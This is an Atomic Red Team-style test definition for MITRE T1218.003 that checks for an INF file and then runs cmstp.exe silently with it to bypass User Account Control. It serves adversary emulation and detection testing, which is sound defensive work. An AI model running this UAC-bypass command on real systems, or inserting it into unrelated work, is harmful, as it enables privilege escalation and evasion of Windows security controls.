# Converted from Atomic Red Team - Signed Binary Proxy Execution: CMSTP
# Source: https://www.atomicredteam.io/atomic-red-team/atomics/T1218.003
# Original auto_generated_guid: 748cb4f6-2fb3-4e97-b7ad-b22635a09ab0

---
api_version: 2.0
uuid: 0358fc39-fb37-4134-b5c8-352ecc3a60d3
name: CMSTP Executing UAC Bypass
authors:
  - isaac_fletcher
  - Atomic Red Team
description: |
  Adversaries may invoke cmd.exe (or other malicious commands) by embedding them in the RunPreSetupCommandsSection of an INF file

mitre:
  tactics:
    - "TA0005 Defense Evasion"
  techniques:
    - "T1218 Signed Binary Proxy Execution"
  subtechniques:
    - "T1218.003 CMSTP"

requirements:
  platforms:
    - os: windows
  superuser: false

args:
  - name: inf_file_uac
    description: Path to the INF file
    type: path
    default: "./T1218.003_uacbypass.inf"

steps:
  - name: ensure_inf_file_exists
    executor: powershell
    inline: |
      if (-not (Test-Path "{{.Args.inf_file_uac}}")) {
        Write-Error "INF file not found at {{.Args.inf_file_uac}}. Exiting..."
        exit 1
      }

  - name: execute_cmstp_uac_bypass
    executor: cmd.exe
    inline: |
      cmstp.exe /s "{{.Args.inf_file_uac}}" /au
